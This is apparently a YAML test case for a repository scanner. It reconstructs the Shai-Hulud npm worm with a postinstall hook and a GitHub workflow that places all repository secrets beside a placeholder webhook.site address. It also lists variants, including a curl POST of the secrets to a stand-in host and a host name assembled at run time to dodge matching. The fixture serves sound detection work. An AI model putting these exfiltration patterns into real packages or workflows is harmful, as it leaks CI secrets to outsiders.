id: shai-hulud
title: Shai-Hulud npm worm
kind: incident
year: 2025
technique: >
  A self-replicating worm published trojanized npm package versions with a postinstall
  script that ran a large bundled file (bundle.js). It harvested tokens and cloud keys,
  sent them to a webhook.site endpoint and a public GitHub repository, republished
  packages of the victim, and added a GitHub workflow that sends the repository's
  secrets to the webhook on every push.
sources:
  - https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem
  - https://www.recordedfuture.com/blog/massive-malicious-npm-package-attack-threatens-software-supply-chains
  - https://www.cohesity.com/trust/redlab/advisories/supply-chain-compromise-shai-hulud/
reconstruction: >
  A package whose postinstall runs bundle.js, which names a request-catcher address
  next to a dummy report, and the persistence workflow whose job holds toJSON(secrets)
  and the same address. Nothing is collected or sent: bundle.js only exports the
  address, and the workflow step only echoes to /dev/null. The webhook address is a
  fixed all-zero placeholder, not an indicator.
files:
  package.json: |
    {"name": "demo-lib", "version": "1.0.1", "scripts": {"postinstall": "node bundle.js"}}
  bundle.js: |
    // Shape only: the target is named, nothing is collected or sent.
    const report = { host: "dummy", tokens: [] };
    const target = "https://webhook.site/00000000-0000-0000-0000-000000000000";
    module.exports = { report, target };
  .github/workflows/shai-hulud-workflow.yml: |
    on: push
    jobs:
      process:
        runs-on: ubuntu-latest
        steps:
          - run: echo "would send CONTENTS to $ENDPOINT" > /dev/null
            env:
              ENDPOINT: https://webhook.site/00000000-0000-0000-0000-000000000000
              CONTENTS: ${{ toJSON(secrets) }}
must_fire:
  - {rule: RC-AUTO-001, path: package.json}
  - {rule: RC-DLX-005, path: bundle.js}
  - {rule: RC-DLX-006, path: .github/workflows/shai-hulud-workflow.yml}
must_not_fire: [RC-AUTO-060, RC-AUTO-061, RC-AUTO-062]
not_covered: >
  Running TruffleHog, publishing packages with stolen tokens and creating repositories
  happen at run time and are not visible as patterns in a repository.

variants:
  - id: all-secrets-to-custom-url
    technique: A network command consumes the all-secrets value at a non-catcher placeholder host.
    files:
      .github/workflows/shai-hulud-workflow.yml: |
        on: push
        jobs:
          process:
            steps:
              - env:
                  CONTENTS: ${{ toJSON(secrets) }}
                run: curl -X POST -d "$CONTENTS" https://example.invalid/u
  - id: curl-in-run
    technique: The workflow step sends the secrets with curl inside run instead of env.
    files:
      .github/workflows/shai-hulud-workflow.yml: |
        on: push
        jobs:
          process:
            runs-on: ubuntu-latest
            steps:
              - run: echo curl -s -d "$CONTENTS" https://webhook.site/00000000-0000-0000-0000-000000000000 > /dev/null
                env:
                  CONTENTS: ${{ toJSON(secrets) }}
  - id: host-without-scheme
    technique: The host name stands alone in an environment variable; the URL is built in the shell.
    files:
      .github/workflows/shai-hulud-workflow.yml: |
        on: push
        jobs:
          process:
            runs-on: ubuntu-latest
            steps:
              - run: echo "would send CONTENTS to $HOST" > /dev/null
                env:
                  HOST: webhook.site
                  CONTENTS: ${{ toJSON(secrets) }}
  - id: joined-host
    technique: The request catcher's host name is assembled from parts at run time.
    files:
      bundle.js: |
        // Shape only: the target is named, nothing is collected or sent.
        const report = { host: "dummy", tokens: [] };
        const target = ["https:/", ["webhook", "site"].join("."), "00000000-0000-0000-0000-000000000000"].join("/");
        module.exports = { report, target };
known_gaps:
  - variant: joined-host
    reason: >
      Host names assembled from parts at run time are not reconstructed; only literal
      addresses are matched.
